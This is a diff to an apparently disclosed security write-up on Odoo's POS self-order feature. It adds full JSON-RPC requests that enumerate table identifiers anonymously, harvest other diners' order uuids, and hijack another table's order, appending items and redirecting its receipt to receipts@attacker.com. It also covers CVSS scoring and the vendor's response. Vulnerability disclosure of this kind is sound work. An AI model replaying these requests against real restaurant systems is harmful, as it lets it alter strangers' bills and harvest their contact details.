@@ -30,6 +30,15 @@ Before any of the interesting parts, the warm-up. `/pos-self/data/<config_id>` i
   table 5: identifier=a2b5947e
 ```
 
+The request is a plain JSON-RPC POST, config id in the path, empty params:
+
+```http
+POST /pos-self/data/1 HTTP/1.1
+Content-Type: application/json
+
+{"jsonrpc":"2.0","id":1,"method":"call","params":{}}
+```
+
 So a completely anonymous request returns every table's `identifier` for the config. The model field is named "Security Token" in the source, and it is handed out to anyone who asks. You now have the keys you need to address every table by id, without walking the room.
 
 ## the fix that was dead code
@@ -63,11 +72,41 @@ A later change (PR 259915) did the real thing and stripped `email` and `mobile` 
   email/mobile stripped by patch -- 6 order uuids still exposed (needed for step 3)
 ```
 
-So the contact-info leak is closed on the current image. Good. But notice what the same response still carries: the per-order `uuid` for every order at every table. The developer stripped the two fields that read as PII and left the identifier that the next request needs. That is the hinge.
+The harvest call is one POST per table identifier. An empty `order_access_tokens` list is accepted, so I never present a token of my own:
+
+```http
+POST /pos-self-order/get-user-data HTTP/1.1
+Content-Type: application/json
+
+{"jsonrpc":"2.0","id":1,"method":"call","params":{
+  "access_token":"7910e6490455459d",
+  "order_access_tokens":[],
+  "table_identifier":"771f05df"
+}}
+```
+
+So the contact-info leak is closed on the current image. Good. But notice what the same response still carries: the per-order `uuid` for every order at every table. `uuid` lives in the same `_load_pos_self_data_fields` list as `email`, `mobile`, and `access_token`, so deleting two fields by name leaves it sitting right there. The developer stripped the two fields that read as PII and left the identifier that the next request needs. That is the hinge.
 
 ## the write primitive nobody closed
 
-`/pos-self-order/process-order/mobile/` feeds the submitted order into `sync_from_ui`, which locates the target order by the client-supplied `uuid` and merges your payload into it. There is no check that the `uuid` belongs to you. The only thing the endpoint validates is the shared config token and that your `table_identifier` is a real table, both of which you have. So I sat at table 1, used my own table's identifier to pass validation, and put table 2's order `uuid` (harvested in step 2) in the body:
+`/pos-self-order/process-order/mobile/` feeds the submitted order into `sync_from_ui`, which locates the target order by the client-supplied `uuid` and merges your payload into it. There is no check that the `uuid` belongs to you. The only thing the endpoint validates is the shared config token and that your `table_identifier` is a real table, both of which you have. So I sat at table 1, used my own table's identifier to pass validation, and put table 2's order `uuid` (harvested in step 2) in the body. The line is the standard Odoo `(0, 0, {...})` create command, so the server appends it to the existing order rather than replacing it:
+
+```json
+{"jsonrpc":"2.0","id":1,"method":"call","params":{
+  "access_token":"7910e6490455459d",
+  "table_identifier":"f05c8ddf",
+  "order":{
+    "uuid":"2e04d4b0-05c1-40a4-bb5a-a49601ca6de9",
+    "email":"receipts@attacker.com",
+    "mobile":"+10000000000",
+    "state":"draft",
+    "amount_total":0,
+    "lines":[[0,0,{"product_id":2,"qty":3,"price_unit":12.5}]]
+  }
+}}
+```
+
+The `table_identifier` is mine (`f05c8ddf`), the `uuid` is Charlie's. I send `amount_total: 0`, but the total in the response is not mine to set. `sync_from_ui` runs the lines through `recompute_prices` server-side, so three burgers at 12.50 plus tax land Charlie's order at 57.51. The attacker writes the items, the server does the pricing.
 
 ```
 === 3. order hijack (not fixed by PR 259915) ===
@@ -105,7 +144,11 @@ Honest note on this one. `remove-order` checks the per-order `access_token` with
 
 I submitted it at `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N` = 8.2. The C:H is deliberate and worth defending: within the POS self-order component for one config, the attacker obtains 100% of the confidential data it manages, every active customer's email, phone, and per-order token, across every table, with no cap on how many. C:L is "no control over what is obtained, or limited loss"; here the attacker controls the enumeration (`/pos-self/data` hands out all identifiers, `order_access_tokens: []` works) and gets the complete PII set. The data set is narrow but it is the whole set, so C:H fits and C:L does not.
 
-Accepted at Medium. Odoo settled the rating after downgrading attack complexity (you need to be near the restaurant for the token) and arguing email plus name is not highly confidential. The cross-table order visibility was a deliberate 19.0 feature and was changed in 19.2. I think the accepted-risk call is fair for the identifiers and weak for the write path, where the consequence is editing someone else's order and redirecting their receipt, not reading a token they could scan off a table. No CVE was assigned.
+Accepted at Medium. Odoo settled the rating after downgrading attack complexity (you need to be near the restaurant for the token) and arguing email plus name is not highly confidential, which pulled confidentiality down and landed the score at 6.5.
+
+I conceded the confidentiality call, that one was theirs to make. The metric I pushed back on was integrity. Once the same payload rewrites a stranger's bill and redirects their receipt, `I:L` does not hold; modifying another customer's financial record and changing their billing contact is `I:H`, which takes the score from 6.5 back to 8.2. The point I leaned on with the triager: the write path is a different code path from the leak. PR 259915 touched `_generate_return_values` and what gets sent back to the caller. It never touched `sync_from_ui`, where the order is located by client-supplied `uuid` and written with no ownership check. Two separate bugs, one fix, and the fix only covered one of them. I offered to file the write path separately.
+
+The cross-table order visibility was a deliberate 19.0 feature and was changed in 19.2. I think the accepted-risk call is fair for the identifiers and weak for the write path, where the consequence is editing someone else's order and redirecting their receipt, not reading a token they could scan off a table. No CVE was assigned.
 
 The lesson the commit history teaches by accident: read what your fix returns, not what it deletes. And when you strip the fields that look like PII, check whether the identifier you left behind is the key to a write you never locked.
 
